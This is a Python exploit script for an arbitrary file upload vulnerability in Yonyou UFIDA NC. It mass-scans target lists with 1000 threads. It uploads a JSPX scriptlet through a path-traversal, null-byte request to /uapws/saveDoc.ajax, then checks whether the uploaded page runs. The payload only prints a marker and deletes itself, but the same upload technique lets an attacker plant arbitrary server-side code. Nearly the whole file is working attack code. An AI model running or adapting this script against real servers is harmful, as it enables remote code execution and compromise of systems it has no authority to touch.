import requests,argparse,sys
from multiprocessing.dummy import Pool
import json
requests.packages.urllib3.disable_warnings()

def main():
    banner()
    parser = argparse.ArgumentParser(description="用友-UFIDA-NC 任意文件上传漏洞")
    parser.add_argument('-u','--url',help="please input your url")
    parser.add_argument('-f','--file',help="please input your file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file,'r',encoding='utf-8') as fp:
            fo = fp.readlines()
            url_list = []
            for i in fo:
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(1000)
        mp.map(poc,url_list)
        mp.close()
        mp.join()

def banner():
    banner = '''
     __                            __                      __  __ 
    |  \                          |  \                    |  \|  \
    | $$____    ______    _______ | $$   __  __   __   __  \$$ \$$
    | $$    \  |      \  /       \| $$  /  \|  \ |  \ |  \|  \|  \
    | $$$$$$$\  \$$$$$$\|  $$$$$$$| $$_/  $$| $$ | $$ | $$| $$| $$
    | $$  | $$ /      $$| $$      | $$   $$ | $$ | $$ | $$| $$| $$
    | $$  | $$|  $$$$$$$| $$_____ | $$$$$$\ | $$_/ $$_/ $$| $$| $$
    | $$  | $$ \$$    $$ \$$     \| $$  \$$\ \$$   $$   $$| $$| $$
     \$$   \$$  \$$$$$$$  \$$$$$$$ \$$   \$$  \$$$$$\$$$$  \$$ \$$
                                                auther:lllo    
    '''
    print(banner)
def poc(target):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0',
        'Content-Type': 'application/x-www-form-urlencoded'


    }
    proxies = {
        'http': '127.0.0.1:8080',
        'https': '127.0.0.1:8080'
    }
    data='''content=<hi xmlns:hi="http://java.sun.com/JSP/Page">
      <hi:directive.page import="java.util.*,java.io.*,java.net.*"/>
   <hi:scriptlet>
            out.println("Hello World!");new java.io.File(application.getRealPath(request.getServletPath())).delete(); 
   </hi:scriptlet>
</hi>'''

    url = target+'/uapws/saveDoc.ajax?ws=/../../test.jspx%00'
    url1 = target+'/uapws/test.jspx'
    try:
        res = requests.post(url=url,data=data,headers=headers,timeout=5,proxies=proxies)
        if res.status_code == 200:
            res1 = requests.get(url=url1,headers=headers,timeout=5).text
            if "Hello World!" in res1:
                with open('result.txt','a') as fp1:
                    fp1.write(f"[+]{target} is veriable"+'\n')
        else:
            print(f'[-]{target} is not veriable')
    except:
        print(f'[*]{target} server erro')

if __name__ =='__main__':
    main()